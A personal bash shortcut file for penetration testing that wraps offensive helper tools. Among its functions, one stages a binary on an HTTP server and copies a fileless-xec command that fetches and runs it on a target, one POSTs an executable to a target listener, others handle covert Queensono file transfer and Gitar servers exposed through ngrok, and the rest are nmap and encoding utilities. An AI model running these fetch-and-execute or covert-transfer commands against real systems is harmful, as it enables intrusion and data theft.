# personnal shortcuts
# 'source' it before making pentest

alias cpy='xclip -selection clipboard'

## Queensono send file
bang.queensono.send.file(){
if [ "$1" = "-h" ]; then
    echo "bang.queensono.send.file \$TA [FILENAME]"
else
    qssender send file -d 1 -r $1 $2
fi
}

## Queensono send file cpy
bang.queensono.send.file.cpy(){
if [ "$1" = "-h" ]; then
    echo "bang.queensono.send.file.cpy \$AA [FILENAME]"
else
    echo "qssender send file -d 1 -r $1 $2" | cpy
fi
}

## Queensono send
bang.queensono.send(){
if [ "$1" = "-h" ]; then
    echo "bang.queensono.send \$TA \"[MSG]\""
else
    qssender send "$2" -d 1 -r $1
fi
}

## Queensono send cpy
bang.queensono.send.cpy(){
if [ "$1" = "-h" ]; then
    echo "bang.queensono.send.cpy \$AA \"[MSG]\""
else
    echo "qssender send \"$2\" -d 1 -r $1 -N" |cpy
fi
}

## Queensono receive file
bang.queensono.receive.file(){
if [ "$1" = "-h" ]; then
    echo "bang.queensono.receive.file [FILENAME]"
else
    qsreceiver receive -p -f $1
fi
}

## Queensono receive file cpy
bang.queensono.receive.file.cpy(){
if [ "$1" = "-h" ]; then
    echo "bang.queensono.receive.file.cpy [FILENAME]"
else
    echo "qsreceiver receive -p -f $1" | cpy
fi
}

## Queensono receive
bang.queensono.receive(){
if [ "$1" = "-h" ]; then
    echo "bang.queensono.receive"
else
     qsreceiver receive
fi
}

## Queensono receive cpy
bang.queensono.receive.cpy(){
if [ "$1" = "-h" ]; then
    echo "bang.queensono.receive.cpy"
else
     echo "qsreceiver receive" | cpy
fi
}

## Fileless-xec as client (Launch a server and copy line to launch on target)
bang.flx.client.cpy(){
if [ "$1" = "-h" ]; then
    echo "bang.flx.client.cpy \$AA \$AP [BINARY_NAME]"
else
    echo "fileless-xec http://$1:$2/$3" | cpy && echo "Command line copied to clipboard (launch it on target machine)" && python3 -m http.server $2 
fi
}

## Fileless-xec server cpy
bang.flx.serve.cpy(){
if [ "$1" = "-h" ]; then
    echo "bang.flx.serve.cpy \$AP"
else
    echo "fileless-xec server $1"|cpy  && echo "Command line copied to clipboard (launch it on target machine)"
fi
}

## Fileless-xec send to server
bang.flx.send(){
if [ "$1" = "-h" ]; then
    echo "bang.flx.send \$TA \$TP [file]"
else
    curl -X POST -F "executable=@$3" http://$1:$2/upload
fi
}

## Gitar start
bang.gitar(){
if [ "$1" = "-h" ]; then
    echo "bang.gitar \$AA"
else
  gitar -e $1
fi
}

## "Safe" Gitar start
bang.gitar.safe(){
if [ "$1" = "-h" ]; then
    echo "bang.gitar.safe \$AA"
else
  docker run --rm --cap-drop=all --cap-add=dac_override -v "${PWD}:/app/upload" -v "${HOME}/.gitar/certs/:/certs:ro" -v "${PWD}:/app/download" -p 9237:9237 gitar -copy=false -u /app/upload -d /app/download -tls=true -c /certs -e $1
fi
}

## Gitar start + url override
bang.gitar.override(){
if [ "$1" = "-h" ]; then
    echo "bang.gitar.override [PROXY_URL]"
else
  gitar -alias-override-url=$1
fi
}

## "Safe" Gitar start + url override
bang.gitar.safe-override(){
if [ "$1" = "-h" ]; then
    echo "ban.gitar.safe-override [PROXY_URL]"
else
  docker run --rm --cap-drop=all --cap-add=dac_override -v "${PWD}:/app/upload" -v "${HOME}/.gitar/certs/:/certs:ro" -v "${PWD}:/app/download" -p 9237:9237 gitar -copy=false -u /app/upload -d /app/download -tls=true -c /certs -alias-override-url=$1
fi
}

## Gitar server as a daemon 
bang.gitar.daemon(){
if [ "$1" = "-h" ]; then
    echo "bang.gitar.daemon \$AA"
else
  nohup gitar -e $1 &
fi
}

## Kill gitar process
bang.gitar.kill(){
if [ "$1" = "-h" ]; then
    echo "bang.gitar.kill"
else
  sudo pkill -9 gitar
fi
}

## Gitar without completion
bang.gitar.no-completion(){
if [ "$1" = "-h" ]; then
    echo "bang.gitar.no-completion [ATTACKER_ADDR]"
else
    gitar -e $1 -completion=false
fi
}

## curl & jse
bang.jse.after-curl(){
if [ "$1" = "-h" ]; then
    echo "bang.jse.after-curl [url]"
else
    URL=$(echo $1 | cut -d "/" -f -3) && curl $1 -H "Accept: text/html" | jse -d $URL -gather-scr
fi
}


## Ngrok expose a https service
bang.expose.https(){
if [ "$1" = "-h" ]; then
    echo "bang.expose-https \$AP"
else
  ngrok http https://127.0.0.1:$1
fi
}

## Ngrok expose a port
bang.expose(){
if [ "$1" = "-h" ]; then
    echo "bang.expose \$AP"
else
  ngrok http $1
fi
}

alias bang.webdavhere='docker run --rm -it -p 8080:80 -v "${PWD}:/srv/data/share" rflathers/webdav'

alias bang.proxycurl='curl --proxy http://127.0.0.1:8080'

bang.mitmproxy.intercept.request.domain(){
if [ "$1" = "-h" ]; then
    echo "bang.mitmproxy.intercept.request.domain [DOMAIN]"
else
  $HOME/.local/bin/mitmproxy --intercept "~u /*$1 & ~q" #need absolute path
fi
}

bang.mitmproxy.intercept.request(){
if [ "$1" = "-h" ]; then
    echo "bang.mitmproxy.intercept.request"
else
  $HOME/.local/bin/mitmproxy --intercept "~q"
fi
}

bang.urlencode(){
if [ "$1" = "-h" ]; then
    echo "bang.urlencode \"[TEXT]\""
else 
  python3 -c "import urllib.parse; print(urllib.parse.quote(input()))" <<< "$1"
fi
}

bang.urldecode(){
if [ "$1" = "-h" ]; then
    echo "bang.decode \"[TEXT]\""
else 
  python3 -c "import urllib.parse; print(urllib.parse.unquote(input()))" <<< "$1"
fi
}


bang.b64encode(){
if [ "$1" = "-h" ]; then
    echo "bang.b64encode \"[TEXT]\""
else 
    echo "$1" | base64
fi
}

bang.b64decode(){
if [ "$1" = "-h" ]; then
    echo "bang.b64decode \"[TEXT]\""
else 
    echo "$1" | base64 -d
fi
}

bang.domain2ip(){
if [ "$1" = "-h" ]; then
    echo "bang.domain2ip [domain]"
else 
    dig +short $1 @resolver1.opendns.com
fi
}



## NMAP ##
alias bang.nmap.show-script='ll /usr/share/nmap/scripts/'

bang.nmap.scan-ports(){
if [ "$1" = "-h" ]; then
    echo "bang.nmap.scan-ports [port] OR bang.nmap.scan-ports [from]-[to]"
else 
    nmap -p $1 $TA
fi
}

#Intensity 5 -> for ctf not real world use
bang.nmap.scan-top100(){
if [ "$1" = "-h" ]; then
    echo "bang.nmap.scan-top100"
else

    nmap --top-port 100 $TA -sV --version-intensity 5
fi
}

#Intensity 5 -> for ctf not real world use
bang.nmap.discovery(){
if [ "$1" = "-h" ]; then
    echo "bang.nmap.discovery [RANGE]"
else 
    nmap $TA -sP
fi
}
alias pup='pup --color'
alias pup.script='pup --color script'
